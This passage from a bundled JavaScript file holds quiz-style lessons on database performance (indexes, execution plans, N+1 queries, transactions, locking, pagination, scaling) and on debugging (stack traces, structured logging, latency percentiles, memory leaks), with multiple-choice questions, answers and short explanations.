writes."},{id:"database.index.4",kind:"code",difficulty:"hard",prompt:"There is an index on `CreatedAt`. Which query is most likely to **prevent** an index seek?",code:{lang:"sql",text:`-- A
WHERE CreatedAt >= '2026-01-01' AND CreatedAt < '2026-02-01'
-- B
WHERE YEAR(CreatedAt) = 2026 AND MONTH(CreatedAt) = 1`},choices:["A","B","Both are the same","Neither can use the index"],answer:1,why:"B wraps the column in functions, so the database cannot use the sorted index directly and usually scans. A compares the raw column to a range, which allows a seek.",remember:"Do not wrap an indexed column in a function in WHERE."}]},{id:"database.plan",title:"Execution plans and logical reads",summary:"See what the database actually did.",minutes:4,blocks:[{type:"text",text:"You write **what** you want (SQL). The database decides **how** to get it. That decision is the **execution plan**."},{type:"diagram",text:`SQL text
   ↓
Optimizer: "Seek or scan? Which join? Which order?"
   ↓
Execution plan  ← you can read this
   ↓
Rows`},{type:"list",items:['**Logical reads** — 8 KB pages read from memory (the buffer cache). The best simple measure of "how much data did this query touch?"',"**Physical reads** — pages that had to come from disk because they were not in memory yet. Slower.","**CPU time** — time spent computing: sorting, hashing, functions.","**IO** — reading and writing pages. Often the real cost of a bad query."]},{type:"code",code:{lang:"sql",text:`SET STATISTICS IO, TIME ON;
SELECT Id, Total FROM Orders WHERE CustomerId = 123;
-- Table 'Orders'. Scan count 1, logical reads 4
--   → good: only 4 pages
-- Table 'Orders'. Scan count 1, logical reads 182 000
--   → bad: the query touched ~1.4 GB of pages`}},{type:"text",text:"Physical reads go down when you run the query again (the pages are now cached). Logical reads stay the same. That is why logical reads are better for comparing two versions of a query."}],remember:'Compare queries by logical reads, not by "it felt faster the second time".',questions:[{id:"database.plan.1",kind:"debug",difficulty:"medium",prompt:"Your API suddenly becomes slow. App CPU is only 20%, but database logical reads for one query are 10× higher than normal. What would you investigate?",choices:["The JSON serializer in the API, since big responses slow it down","The query's execution plan — it may have changed from seek to scan","Increase the connection pool size so more queries can run at once","Add more API servers so the load is spread across more machines"],answer:1,why:"10× more logical reads means the query touches far more data. A changed plan (missing index, bad statistics, different parameters) is the usual cause.",remember:"Reads jumped → look at the plan."},{id:"database.plan.2",kind:"mcq",difficulty:"medium",prompt:"You run the same query twice. Physical reads drop from 5,000 to 0. Logical reads stay at 5,000. Why?",choices:["The optimizer learned from the first run and chose a better plan","The pages are now in memory; the query still reads the same pages","The index was rebuilt automatically after the first run finished","Logical reads are counted wrongly when the data comes from memory"],answer:1,why:"The first run loaded pages from disk (physical). The second run found them in memory. The query still needs 5,000 pages each time — that is the logical read count."},{id:"database.plan.3",kind:"scenario",difficulty:"hard",prompt:"A query is fast in your local test (10,000 rows) and slow in production (50 million rows). Before changing the code, what is the most useful thing to look at?",choices:["The production execution plan and its logical reads","The local execution plan, because the plan is the same at any size","The CPU and memory graphs of the API servers in production","The size of the JSON response that is sent back to the client"],answer:0,why:"With 10,000 rows almost any plan is fast. The production plan shows what really happens at scale: scans, big sorts, key lookups.",remember:"Small data hides bad plans."}]},{id:"database.n-plus-one",title:"The N+1 query problem",summary:"One query becomes a thousand.",minutes:3,blocks:[{type:"text",text:"**N+1** = 1 query to load a list, then 1 more query **for each item** in the list."},{type:"code",code:{lang:"csharp",text:`var orders = await db.Orders.ToListAsync();      // 1 query
foreach (var o in orders)
{
    // lazy loading → 1 query per order
    Console.WriteLine(o.Customer.Name);           // N queries
}`}},{type:"diagram",text:`10 orders     →    11 queries   (fine in dev)
1 000 orders  →  1 001 queries   (slow in prod)
Each query ~2 ms round trip → 2 seconds of waiting`},{type:"code",code:{lang:"csharp",text:`// Fix: load related data in one go
var orders = await db.Orders
    .Include(o => o.Customer)
    .ToListAsync();                               // 1 query (a JOIN)`}},{type:"text",text:"How to spot it: the database log or profiler shows the **same query shape** many times in one request, only the parameter changes."}],remember:"Same query, different id, many times in one request → N+1.",questions:[{id:"database.n-plus-one.1",kind:"debug",difficulty:"easy",prompt:"One page load produces 501 SQL queries. 500 of them are `SELECT * FROM Customers WHERE Id = @p`. What is this?",choices:["A deadlock","An N+1 query problem","A missing primary key","A CORS error"],answer:1,why:"One query loaded a list, then the code ran one extra query per item. That is the classic N+1 pattern."},{id:"database.n-plus-one.2",kind:"compare",difficulty:"medium",prompt:"You must show 1,000 orders with customer names. Which is better?",choices:["Load orders, then loop and load each customer by id","Load orders and customers together with a JOIN / Include, or one query for all needed customer ids"],answer:1,why:"Two queries or one JOIN replace 1,001 round trips. Network latency per query adds up fast.",remember:"Fetch related data in a batch, not in a loop."},{id:"database.n-plus-one.3",kind:"scenario",difficulty:"medium",prompt:"Why does N+1 often pass code review and testing?",choices:["Because the ORM merges the loop queries into one batch in tests","Because test data is small, so 11 queries feel instant","Because the database caches every result after the first query","Because the loop runs in parallel, so the extra queries are free"],answer:1,why:"With 10 rows you get 11 fast queries. The problem only appears when production has thousands of rows."}]},{id:"database.transactions",title:"Transactions and isolation",summary:"All or nothing — and what others can see.",minutes:4,blocks:[{type:"text",text:"A **transaction** groups several changes so they succeed or fail **together**."},{type:"code",code:{lang:"sql",text:`BEGIN TRANSACTION;
  UPDATE Accounts SET Balance = Balance - 100 WHERE Id = 1;
  UPDATE Accounts SET Balance = Balance + 100 WHERE Id = 2;
COMMIT;   -- both happen, or (on error / ROLLBACK) neither`}},{type:"text",text:'**Isolation** answers: "While my transaction runs, what can other transactions see and change?"'},{type:"diagram",text:`Level               Can read uncommitted data?   Blocking
READ UNCOMMITTED    yes ("dirty read")           least
READ COMMITTED      no  (SQL Server default)     some
REPEATABLE READ     no, and rows I read stay     more
SERIALIZABLE        no, like running one-by-one  most
SNAPSHOT            no, reads an old version     readers don't block writers`},{type:"text",text:"Higher isolation = fewer surprises, more waiting. Lower isolation = faster, but you may read data that is later rolled back."},{type:"text",text:"Keep transactions **short**. Never wait for a user, an email server or an HTTP call inside a transaction."}],remember:"Transaction = all or nothing. Keep it short.",questions:[{id:"database.transactions.1",kind:"scenario",difficulty:"easy",prompt:"You transfer money: subtract from account A, add to account B. The server crashes between the two updates. Without a transaction, what can happen?",choices:["Nothing, databases handle it","Money disappears from A but never arrives in B","Both updates are undone automatically","The money is added twice"],answer:1,why:"Without a transaction the first update is already saved when the crash happens. A transaction makes both updates succeed or fail together."},{id:"database.transactions.2",kind:"mcq",difficulty:"medium",prompt:"A report uses `WITH (NOLOCK)` (read uncommitted). What risk does that add?",choices:["The report can include changes that are later rolled back","The report locks the whole table and blocks all writers","The report cannot use a parallel plan, so it runs on one core","No real risk: it only skips waiting, the results are the same"],answer:0,why:'NOLOCK reads data that is not committed yet ("dirty reads"). It can also skip or double-count rows while pages move.',remember:"NOLOCK = fast, but may be wrong."},{id:"database.transactions.3",kind:"code",difficulty:"hard",prompt:"What is the biggest problem in this code?",code:{lang:"csharp",text:`using var tx = await db.Database.BeginTransactionAsync();
order.Status = "Paid";
await db.SaveChangesAsync();
await paymentClient.ChargeAsync(order);   // HTTP call, 2–30 s
await tx.CommitAsync();`},choices:["SaveChangesAsync must be called again after the payment call","The transaction stays open (holding locks) during a slow HTTP call","Transactions do not work with async/await, so the commit is ignored","Status should be an enum, because a string can be saved with a typo"],answer:1,why:"Locks taken by the update are held until commit. A slow external call keeps them for seconds and blocks other requests that touch that order.",remember:"No network calls inside a DB transaction."}]},{id:"database.locks",title:"Locks and deadlocks",summary:"Why queries wait for each other.",minutes:4,blocks:[{type:"text",text:"When a transaction changes a row, it takes a **lock**. Other transactions that need that row must **wait**. This is called **blocking**. Blocking is normal for a short time."},{type:"text",text:"A **deadlock** is when two transactions wait for each other forever."},{type:"diagram",text:`Tx 1: locks Order 1  ──── wants Order 2 ───┐
                                           ▼
Tx 2: locks Order 2  ──── wants Order 1 ───┘
        🔒 both wait → SQL Server kills one ("deadlock victim")`},{type:"list",items:["Access tables and rows in the **same order** everywhere.","Keep transactions **short**.","Add indexes so updates lock **fewer rows** (a scan may lock many).","Retry the victim — deadlocks can still happen sometimes."]}],remember:"Blocking = waiting. Deadlock = waiting for each other forever.",questions:[{id:"database.locks.1",kind:"mcq",difficulty:"easy",prompt:"What is a deadlock?",choices:["A query that runs so long that it hits the command timeout","Two transactions each waiting for a lock the other one holds","A table that stays locked because it has no indexes at all","A transaction that waits a few seconds for another to commit"],answer:1,why:"Each transaction waits for the other. The database detects the cycle and stops one of them."},{id:"database.locks.2",kind:"scenario",difficulty:"medium",prompt:"Endpoint A updates `Orders` then `Payments`. Endpoint B updates `Payments` then `Orders`. Under load you see deadlocks. What is the simplest structural fix?",choices:["Use the same order in both: always `Orders` then `Payments`","Add more CPU to the database so transactions finish faster","Add `WITH (NOLOCK)` to both updates so they take no locks","Run the two endpoints on different API servers"],answer:0,why:'Deadlocks need a cycle. If everyone locks in the same order, nobody can hold the "second" lock while waiting for the "first".',remember:"Same lock order everywhere."},{id:"database.locks.3",kind:"debug",difficulty:"hard",prompt:"An `UPDATE Orders SET Status = 2 WHERE CustomerId = @id` causes a lot of blocking. There is no index on CustomerId. Why might an index reduce the blocking?",choices:["Indexes turn off row locking, so the update takes no locks at all","A scan reads and may lock many rows; a seek touches only matching rows","Indexes let the update commit in small batches automatically","It would not help: an UPDATE always locks the whole table anyway"],answer:1,why:"To find the rows, a scan reads (and can lock) far more rows than needed. A seek touches only the matching rows, so fewer locks and shorter waits."},{id:"database.locks.4",kind:"truefalse",difficulty:"medium",prompt:"If your design is good, you never need retry logic for deadlocks.",choices:["True","False"],answer:1,why:"Good design makes deadlocks rare, not impossible. Catch the deadlock error (1205 in SQL Server) and retry the whole transaction a few times."}]},{id:"database.pagination",title:"Pagination: OFFSET vs keyset",summary:"Why page 5,000 is slow.",minutes:3,blocks:[{type:"text",text:"Never return 1 million rows to a screen. Return a **page**."},{type:"code",code:{lang:"sql",text:`-- OFFSET: simple, but slow on deep pages
SELECT Id, Title FROM Posts
ORDER BY Id
OFFSET 100000 ROWS FETCH NEXT 20 ROWS ONLY;
-- the database still walks through 100 000 rows to skip them

-- Keyset ("seek"): remember the last id you showed
SELECT TOP 20 Id, Title FROM Posts
WHERE Id > @lastId
ORDER BY Id;
-- jumps straight to @lastId using the index`}},{type:"compare",left:{title:"OFFSET",items:['Easy "go to page 37"',"Gets slower as the page number grows","Rows can shift if data changes"]},right:{title:"Keyset",items:["Fast on any page",'Only "next / previous", no jump to page 37',"Needs a stable, indexed sort key"]}}],remember:"Deep pages → keyset pagination (WHERE Id > @lastId).",questions:[{id:"database.pagination.1",kind:"perf",difficulty:"medium",prompt:"Page 1 of an infinite scroll is fast. Page 4,000 takes 3 seconds. The query uses `OFFSET ... FETCH`. Why?",choices:["The browser keeps all 4,000 pages in memory and becomes slow","OFFSET must read and skip all earlier rows before returning the page","The database caches only the first pages, so later pages come from disk","Higher page numbers return bigger pages, so the network is slower"],answer:1,why:"To skip 80,000 rows the database still has to walk through them. The cost grows with the page number."},{id:"database.pagination.2",kind:"compare",difficulty:"medium",prompt:'A mobile feed only has "load more". Which approach fits better?',choices:["OFFSET / FETCH with a page number","Keyset pagination using the last seen id or timestamp"],answer:1,why:"A feed never jumps to page 37. Keyset pagination stays fast at any depth and does not skip or repeat items when new posts arrive."},{id:"database.pagination.3",kind:"scenario",difficulty:"easy",prompt:"An API endpoint `GET /orders` returns all 2 million orders as JSON. What is the best first fix?",choices:["Compress the JSON response with gzip","Add pagination with a maximum page size","Move the endpoint to a bigger, faster server","Increase the API timeout so the request can finish"],answer:1,why:"No client needs 2 million rows at once. A page size limit protects the database, the network and the client.",remember:"Every list endpoint needs a page size limit."}]},{id:"database.scaling",title:"Scaling a database",summary:'What to try before "we need a new database".',minutes:4,blocks:[{type:"text",text:"When the database is the bottleneck, go in this order. Each step is cheaper than the next."},{type:"diagram",text:`1. Fix the query     → indexes, N+1, SELECT only needed columns
2. Cache             → don't ask the DB the same thing 1 000×/sec
3. Scale up          → bigger server (more RAM, faster disk)
4. Read replicas     → reads go to copies, writes to the primary
5. Partition / shard → split data across tables or servers
                         (hardest — changes your whole app)`},{type:"example",title:"Read replica catch",text:"Replicas are a little behind the primary (replication lag). A user saves their profile, the next page reads from a replica, and shows the old name. You must decide which reads need fresh data."}],remember:"Fix queries first. Sharding is the last step, not the first.",questions:[{id:"database.scaling.1",kind:"scenario",difficulty:"medium",prompt:"The database CPU is at 90%. One query runs 2,000 times per second and does a full scan. A teammate suggests sharding the database. What do you suggest first?",choices:["Agree, and start sharding the database by customer id","Fix that query (index, maybe cache the result) and measure again","Move the data to a NoSQL database, which scales better","Add more API servers to spread the 2,000 calls per second"],answer:1,why:"One hot query with a scan is a cheap fix. Sharding is a huge, risky change. Fix and measure first.",remember:"Measure → fix the biggest query → measure again."},{id:"database.scaling.2",kind:"debug",difficulty:"hard",prompt:'After adding a read replica, users say: "I changed my address, but the page still shows the old one. After a refresh it is correct." What is the most likely cause?',choices:["The browser cached the old page and showed it again","Replication lag: the read went to a replica without the change yet","The update was rolled back first and then retried later","The index on the address column is corrupted on the replica"],answer:1,why:"Replicas apply changes slightly later. Reads right after a write should go to the primary (read-your-own-writes)."},{id:"database.scaling.3",kind:"mcq",difficulty:"easy",prompt:"What does a read replica help with?",choices:["Faster writes, because writes are split across the copies","Spreading read traffic across more servers","Smaller tables, because each replica holds part of the data","Removing the need for indexes on large tables"],answer:1,why:"All writes still go to the primary. Replicas take read load off it."}]}],cheatSheet:[{title:"Structure",items:[{term:"PRIMARY KEY",meaning:"Unique id of a row"},{term:"FOREIGN KEY",meaning:"Value must exist in another table — prevents orphan rows"},{term:"INDEX",meaning:"Sorted copy of some columns → find rows faster"},{term:"INCLUDE columns",meaning:"Extra columns stored in the index so no lookup to the table is needed"}]},{title:"Reading a plan",items:[{term:"INDEX SEEK",meaning:"Jump to specific matching entries ✅"},{term:"INDEX / TABLE SCAN",meaning:"Read many or all entries ⚠️ on big tables"},{term:"LOGICAL READS",meaning:'8 KB pages read from memory — "how much data did I touch?"'},{term:"PHYSICAL READS",meaning:"Pages read from disk — drop to 0 when cached"},{term:"HIGH LOGICAL READS",meaning:"Often the query reads too much data"},{term:"f(Column) in WHERE",meaning:"Usually blocks a seek — compare the raw column instead"}]},{title:"Concurrency",items:[{term:"TRANSACTION",meaning:"All changes succeed or none do"},{term:"BLOCKING",meaning:"One transaction waits for another’s lock"},{term:"DEADLOCK",meaning:"Two transactions wait for each other → one is killed"},{term:"NOLOCK",meaning:"Dirty reads — fast but may be wrong"},{term:"Rule",meaning:"Short transactions, same lock order, no HTTP calls inside"}]},{title:"Common problems",items:[{term:"N+1",meaning:"One query + one more per item → batch / JOIN / Include"},{term:"OFFSET deep pages",meaning:"Slow → use keyset: WHERE Id > @lastId"},{term:"SELECT *",meaning:"Reads columns you do not need, blocks covering indexes"},{term:"Replication lag",meaning:"Replica shows old data right after a write"}]}]},g=Object.freeze(Object.defineProperty({__proto__:null,default:y},Symbol.toStringTag,{value:"Module"})),w={id:"debugging",title:"Debugging",emoji:"🐛",tagline:"Don't guess. Find evidence.",lessons:[{id:"debugging.method",title:"Don't guess. Find evidence.",summary:"A simple loop that finds bugs faster than guessing.",minutes:4,blocks:[{type:"text",text:`Most debugging time is lost by **guessing**.
"Maybe it is the cache?" → change something → deploy → still broken → guess again.
A better way: follow the evidence.`},{type:"diagram",text:`Bug
 ↓
Reproduce         can I make it happen on purpose?
 ↓
Collect evidence  logs, metrics, traces, data
 ↓
Find clues        what is different when it fails?
 ↓
Form hypothesis   "X causes it, because Y"
 ↓
Test              prove the idea right or wrong
 ↓
Fix
 ↓
Verify            bug gone? nothing else broken?`},{type:"list",items:["**When** did it start? What changed then: a deploy, a config value, the data, the traffic?","**Who** is affected? Everyone, or only some users, countries, browsers, big accounts?",'**How often?** Always, or only sometimes? "Sometimes" often means timing, load or specific data.']},{type:"text",text:'A good hypothesis is **specific** and can be proven wrong.\n❌ "Something is weird with the server."\n✅ "Orders with an expired discount code fail, because `DiscountService` returns null for them."'},{type:"text",text:"Change **one thing at a time**. If you change three things and the bug disappears, you do not know which change fixed it — or if one of them only hid it."},{type:"example",title:"The fix that was not a fix",text:"An API had many database timeouts. Someone raised the timeout from 30 s to 120 s. The errors disappeared from the dashboard. The real cause was a missing index after a migration. Users now simply waited longer."}],remember:"Don't guess. Find evidence. Change one thing at a time.",questions:[{id:"debugging.method.1",kind:"scenario",difficulty:"easy",prompt:'A user reports "checkout is broken". It works fine on your machine. What is the best next step?',choices:["Add more null checks and try/catch blocks around the checkout code",'Close the ticket as "cannot reproduce", since it works on your machine',"Get the time, user and error, then find their request in the logs","Restart the production servers to clear any bad state, then wait"],answer:2,why:"You need evidence from the failing case, not from your machine. Time and user id let you find the exact request in the logs.",remember:"Start from the failing case, not from your laptop."},{id:"debugging.method.2",kind:"mcq",difficulty:"medium",prompt:"Which of these is a **useful** hypothesis?",choices:['"Something in the backend acts weird since the last release"','"It is probably a random network problem between services"','"The database is slow in general, so things break sometimes"','"Expired discount codes make DiscountService return null"'],answer:3,why:"A useful hypothesis names a specific cause you can test. You can try an expired code and see if it fails. The others are too vague to prove right or wrong."},{id:"debugging.method.3",kind:"scenario",difficulty:"easy",prompt:"Errors started on Tuesday at 14:00. Before that, everything was fine for weeks. What is the most useful first question?",choices:["What changed around Tuesday 14:00: deploy, config, data or traffic?","Which programming language is the service written in?","How many unit tests does the project have?","Who wrote the original code five years ago?"],answer:0,why:"Code that worked for weeks does not break by itself. Something changed at that moment. Find the change and you often find the cause.",remember:"New bug at a clear time → look for what changed at that time."},{id:"debugging.method.4",kind:"scenario",difficulty:"medium",prompt:"To fix a bug you upgrade a library, add an index and change a timeout, all in one deploy. The bug is gone. What is the problem?",choices:["Nothing, the bug is fixed and that is all that matters","You do not know which change fixed it, or if one only hid it","Indexes cannot be added in the same deploy as code changes","The library upgrade will undo the index automatically"],answer:1,why:"With three changes at once you learn nothing about the cause. If the bug comes back, or one change causes a new problem, you start from zero."},{id:"debugging.method.5",kind:"scenario",difficulty:"hard",prompt:"An API has many SQL timeouts. A teammate raises the command timeout from 30 s to 120 s and the timeout errors stop. What is wrong with this fix?",choices:["SQL Server does not allow timeouts above 60 seconds","Longer timeouts make SQL Server choose worse plans","It hides the symptom: the query is still slow and users wait longer","Nothing is wrong, fewer errors means the problem is solved"],answer:2,why:"The timeout was the alarm, not the problem. The slow query is still there. Find why it is slow (plan, index, locks) instead of turning off the alarm.",remember:"Do not silence the alarm. Find what triggered it."}]},{id:"debugging.stack-traces",title:"Reading stack traces",summary:"Where the error really is, and where to start looking.",minutes:4,blocks:[{type:"text",text:"A **stack trace** is the path the code took to reach the error.\nIn .NET the first line is the exception **type** and **message**. Then come the `at` lines (frames). The **top frame** is where the exception was thrown. Each line below is the caller of the line above."},{type:"code",code:{lang:"text",text:`System.NullReferenceException: Object reference
  not set to an instance of an object.
   at Shop.Pricing.ShippingCalculator.Calculate(Order o)
      in ShippingCalculator.cs:line 42       ← thrown here
   at Shop.Orders.CheckoutService.PlaceOrder(Cart c)
      in CheckoutService.cs:line 88          ← called it
   at Shop.Api.OrdersController.Post(CartDto dto)
   at Microsoft.AspNetCore.Mvc...            ← framework`}},{type:"list",items:["1. Read the exception **type** and **message**.","2. Find the **first frame from your own code**. Skip framework and library frames — they are rarely the bug.","3. Open that file and line.","4. Ask: which value here could be null, empty or wrong?"]},{type:"text",text:"**Inner exceptions.** The real cause is often wrapped inside another exception.\n`DbUpdateException: An error occurred while saving the entity changes. See the inner exception for details.`\n  ---> `SqlException: Cannot insert duplicate key in object dbo.Users.`\nAlways read the whole chain. The **innermost** one usually tells the truth."},{type:"code",code:{lang:"csharp",text:`catch (Exception ex)
{
    _log.LogError(ex, "Payment failed");  // pass ex!
    throw;       // ✅ keeps the original stack trace
    // throw ex; // ❌ resets the trace to this line
}`}}],remember:"Message first, then the first frame in YOUR code, then the inner exception.",questions:[{id:"debugging.stack-traces.1",kind:"code",difficulty:"medium",prompt:"Where should you look first?",code:{lang:"text",text:`System.InvalidOperationException:
  Sequence contains no elements
   at System.Linq.ThrowHelper.ThrowNoElementsException()
   at System.Linq.Enumerable.First[TSource](...)
   at Shop.Invoices.InvoiceService.GetMainLine(Order o)
      in InvoiceService.cs:line 31
   at Shop.Invoices.InvoiceService.Build(Order o)
      in InvoiceService.cs:line 12`},choices:["Inside System.Linq — it probably has a bug","InvoiceService.cs line 12, where Build starts","The controller that started the request","InvoiceService.cs line 31, where your code calls First()"],answer:3,why:"LINQ threw because it was asked for the first item of an empty list. The first frame in your code (line 31) is where that call happens. Ask why the order has no lines there.",remember:"Skip framework frames. Start at the first frame in your code."},{id:"debugging.stack-traces.2",kind:"debug",difficulty:"medium",prompt:"The log only says: `DbUpdateException: An error occurred while saving the entity changes. See the inner exception for details.` What is the most useful next step?",choices:["Read or log the inner exception — it has the real database error","Increase the database command timeout, because the save took too long","Wrap SaveChanges in a retry loop, because the error is likely temporary","Call SaveChanges a second time to check that the same error comes back"],answer:0,why:'The outer exception only says "saving failed". The inner exception says why: a duplicate key, a NULL in a required column, a foreign key error, and so on.'},{id:"debugging.stack-traces.3",kind:"code",difficulty:"hard",prompt:"This code runs when a payment fails. What useful information is lost?",code:{lang:"csharp",text:`try
{
    await _payments.ChargeAsync(order);
}
catch (Exception ex)
{
    _log.LogWarning("Charge failed");
    throw ex;
}`},choices:["Nothing, because the exception is still rethrown","Only the message text of the exception","The original stack trace, and the error details in the log","The order object, because async code loses it"],answer:2,why:"`throw ex;` resets the stack trace so it seems to start in this catch block. And the log call does not pass `ex`, so the log has no exception details. Use `_log.LogWarning(ex, ...)` and `throw;`.",remember:"Use `throw;` not `throw ex;`. Always pass the exception to the logger."},{id:"debugging.stack-traces.4",kind:"truefalse",difficulty:"easy",prompt:"In a .NET stack trace, the top `at` line shows where the request started (for example, the controller).",choices:["True","False"],answer:1,why:"The top frame is where the exception was thrown — the deepest call. The place where the request started (like the controller) is further down."}]},{id:"debugging.logs",title:"Logs that actually help",summary:"Structured logs, correlation ids, and the silent catch.",minutes:4,blocks:[{type:"text",text:"A good log line answers: **what** happened, to **which** thing (order id, user id), **when**, and **how long** it took."},{type:"compare",left:{title:"Plain text log",items:['`"Order 512 failed for user 9"`',"Search with text matching only","Hard to count or graph"]},right:{title:"Structured log",items:["`{ OrderId: 512, UserId: 9 }` as fields","Filter: `OrderId = 512`","Easy: failures per hour"]}},{type:"code",code:{lang:"csharp",text:`// ❌ interpolation: values are baked into the text
_log.LogInformation($"Order {order.Id} paid in {ms} ms");

// ✅ message template: OrderId and Ms become fields
_log.LogInformation("Order {OrderId} paid in {Ms} ms",
    order.Id, ms);`}},{type:"text",text:"A **correlation id** is one id per request. It is passed to every service and written on every log line. With it, you filter one user's request across five services. Without it, you match timestamps by hand."},{type:"diagram",text:`Browser ─► API ─► Orders ─► Payments
     CorrelationId = 7f3a  (on every log line)

Search: CorrelationId = 7f3a
 → 12 lines, 3 services, one clear story`},{type:"text",text:"The worst log is **no log**. A swallowed exception hides the error forever:"},{type:"code",code:{lang:"csharp",text:`try { await SendInvoiceEmail(order); }
catch { }   // ❌ it failed. Nobody will ever know.

// ✅ if you really want to continue, at least log it
catch (Exception ex)
{
    _log.LogError(ex, "Invoice email failed for {OrderId}",
        order.Id);
}`}}],remember:"Log with ids and structure. Never catch and ignore.",questions:[{id:"debugging.logs.1",kind:"debug",difficulty:"medium",prompt:"Customers say invoices sometimes never arrive. The logs show **no errors** at all. You find this code. Why are there no errors in the logs?",code:{lang:"csharp",text:`try
{
    await _email.SendAsync(invoice);
}
catch
{
}`},choices:["The email server never fails, so the bug is elsewhere","Async methods cannot throw exceptions","The log level is set too high to show errors","The exception is caught and ignored, so nothing is logged"],answer:3,why:'An empty catch block swallows the error. The send fails, the code continues, and no log line is written. "No errors in the logs" does not mean "no errors".',remember:"Empty catch = invisible bug."},{id:"debugging.logs.2",kind:"scenario",difficulty:"medium",prompt:"A request goes through Gateway → Orders → Payments → Notifications. One user's order failed at 10:42. Thousands of requests ran at that minute. What makes it easy to find all related log lines?",choices:["Turning on Debug logging in every service so no detail is missed","A correlation id written on every log line in every service","Keeping log files longer and searching all of them for 10:42","Syncing all server clocks so lines can be matched by exact time"],answer:1,why:"One shared id lets you filter exactly the lines of this request in every service. More logs or better clocks still leave you guessing which lines belong together."},{id:"debugging.logs.3",kind:"code",difficulty:"medium",prompt:"Which log call lets you later filter logs by the field `OrderId = 512`?",code:{lang:"csharp",text:`// A
_log.LogInformation($"Order {id} shipped");
// B
_log.LogInformation("Order {OrderId} shipped", id);`},choices:["A","B","Both, they produce the same log","Neither"],answer:1,why:"B uses a message template, so the logger stores `OrderId` as a separate field. A builds a finished string first, so the logger only sees text.",remember:'Message template, not `$"..."`, in log calls.'},{id:"debugging.logs.4",kind:"scenario",difficulty:"hard",prompt:"You need more detail for one bug in production. Turning on Debug logs for all services would create 50 GB per hour. What is the better approach?",choices:["Turn on Debug everywhere and leave it on, just in case","Remove all logging to save money, then add it back later","Raise the level only for the one component, for a short time","Copy the full production database to your laptop"],answer:2,why:"Most logging libraries let you change the level per category or namespace at runtime. Turn it up where the bug is, collect evidence, then turn it back down."}]},{id:"debugging.latency",title:"Metrics and latency: averages lie",summary:"p50, p95, p99 — and why the slow tail matters.",minutes:4,blocks:[{type:"text",text:`**Logs** tell you what happened to one request.
**Metrics** tell you how much and how often, across all requests: requests per second, error rate, latency, CPU, memory.`},{type:"text",text:`**Latency percentiles**:
**p50** (median): half of the requests are faster than this.
**p95**: 95% are faster, the slowest 5% are slower.
**p99**: only the slowest 1% are slower.`},{type:"diagram",text:`100 requests:
  95 × 100 ms
   5 × 4 000 ms

Average ≈ 295 ms     "looks OK"
p50     =  100 ms    "looks great"
p99     = 4 000 ms   "5 users waited 4 seconds!"`},{type:"text",text:"The slow tail matters more than it looks. One page may call 10 backend services. If each is slow 1% of the time, about **1 in 10 pages** hits at least one slow call. And your biggest customers (large carts, many orders) are often the ones in the tail."},{type:"list",items:["**Traffic** — requests per second.","**Errors** — how many fail.","**Latency** — p50 / p95 / p99.","**Saturation** — how full things are: CPU, memory, connection pool, queue length."]},{type:"example",title:"Reading a graph",text:"p99 latency jumped at 10:05, exactly when deploy 1.42 finished. That is not proof, but it is a strong clue about where to look first."}],remember:"Watch p95/p99, not just the average. The tail is where users suffer.",questions:[{id:"debugging.latency.1",kind:"perf",difficulty:"medium",prompt:'The dashboard shows average latency 120 ms, stable all week. Support gets many complaints: "the page is sometimes very slow". What do you check?',choices:["Nothing: a stable 120 ms average means users are fine","The CSS bundle size, because a big bundle makes every page slow","p95/p99 latency, because the average can hide a slow tail","How many commits were pushed today, to spot risky changes"],answer:2,why:"A few very slow requests barely move the average when most are fast. Percentiles show the slow tail that users complain about."},{id:"debugging.latency.2",kind:"mcq",difficulty:"easy",prompt:"An endpoint has **p99 latency = 800 ms**. What does that mean?",choices:["99% of requests take 800 ms or less; 1% take longer","99% of requests take exactly 800 ms","The average request takes 800 ms","Only 1% of requests are faster than 800 ms"],answer:0,why:"p99 is the value that 99% of requests stay under. It describes the slow end, not the typical request."},{id:"debugging.latency.3",kind:"debug",difficulty:"hard",prompt:"After a deploy, p50 latency is unchanged (90 ms), but p99 went from 300 ms to 6 s. The error rate is flat. Which cause fits best?",choices:["Every request got 5 ms slower from one extra log line","A new slow path that only some requests hit, e.g. large accounts","The whole service is down for everyone","The CDN is serving old images to users"],answer:1,why:"The typical request is still fast, so the change hurts only a small group. A code path for big data (like an N+1 on large accounts) fits that pattern.",remember:"p50 fine + p99 bad → a slow path for some requests."},{id:"debugging.latency.4",kind:"debug",difficulty:"medium",prompt:'Logs show: "Timeout expired. The timeout period elapsed prior to obtaining a connection from the pool." App CPU is 15%. What does this point to?',choices:["The servers need more CPU to open new database connections faster","Traffic is too low, so idle connections close and must be reopened","The log files grew too large and now slow down every request","Connections are held too long or never returned (slow queries, leaks)"],answer:3,why:"The connection pool is full (saturation). Either queries hold connections for a long time, or code forgets to dispose connections. More CPU does not help."}]},{id:"debugging.resources",title:"CPU, memory and IO",summary:"Is the app computing, waiting, or fighting memory?",minutes:5,blocks:[{type:"text",text:`When an app is slow, it is usually doing one of three things:
**computing** (CPU), **waiting** (IO: database, disk, network) or **fighting memory** (garbage collection, swapping).`},{type:"diagram",text:`Symptom                    First suspect
High CPU, slow             hot loop, heavy JSON, regex
Low CPU, slow              waiting: DB, HTTP, locks
Low CPU, slow, threads ↑   blocked threads (.Result)
Memory low point rises     leak: something keeps refs
Memory saw-tooth, stable   normal GC, probably fine`},{type:"text",text:'**Memory leaks in .NET.** The garbage collector (GC) frees objects that nobody references. So a .NET "leak" usually means **something still holds a reference**: a static list, a cache with no size limit, an event handler that is never removed.'},{type:"code",code:{lang:"csharp",text:`public static class ReportCache
{
    // ❌ grows forever: nothing is ever removed
    public static readonly Dictionary<string, byte[]> Items
        = new();
}`}},{type:"compare",left:{title:"Healthy memory ✅",items:["Goes up and down (saw-tooth)","Low point after GC stays about the same","Stable over days"]},right:{title:"Leak ⚠️",items:["Low point after each GC keeps rising",'A restart "fixes" it for a while',"Ends with OutOfMemory or the container killed"]}},{type:"text",text:"**IO wait**: CPU is low, but requests are slow. The app is waiting for something else. Measure the time of each external call (DB, HTTP, disk). A trace shows this directly."},{type:"text",text:"**Thread pool starvation** (.NET): code blocks a thread with `.Result` or `.Wait()` on async work. Under load, all threads are stuck waiting and new requests queue up. CPU is low, latency is huge. Fix: `await` all the way down."}],remember:"High CPU = computing. Low CPU + slow = waiting. Rising memory low point = leak.",questions:[{id:"debugging.resources.1",kind:"debug",difficulty:"medium",prompt:"Memory goes up during the day and drops after each GC, but the lowest point after GC is higher every hour. Every night the container is killed for using too much memory. Most likely cause?",choices:["Normal GC behaviour: memory always grows during busy hours of the day","The CPU is too slow, so the GC cannot run often enough to keep up","A leak: something keeps references, e.g. an unbounded 